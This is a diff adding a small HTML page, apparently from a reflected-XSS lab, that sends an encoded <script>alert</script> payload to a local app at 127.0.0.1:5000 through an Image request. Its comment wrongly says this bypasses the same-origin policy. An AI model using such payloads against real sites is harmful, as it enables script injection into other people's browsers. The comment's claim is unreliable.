@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>恶意网站</title>
+</head>
+<body>
+    <script>
+        // 构建目标网站的URL，包括恶意的XSS代码
+        var targetUrl = "http://127.0.0.1:5000/?content=%3Cscript%3Ealert('XSS%E5%8F%8D%E5%B0%84%E5%AE%9E%E9%AA%8C%E6%88%90%E5%8A%9F%EF%BC%81')%3C%2Fscript%3E&submit=%E6%8F%90%E4%BA%A4";
+
+        // 利用Image对象发起GET请求，绕过同源策略
+        var img = new Image();
+        img.src = targetUrl;
+
+    </script>
+</body>
+</html>
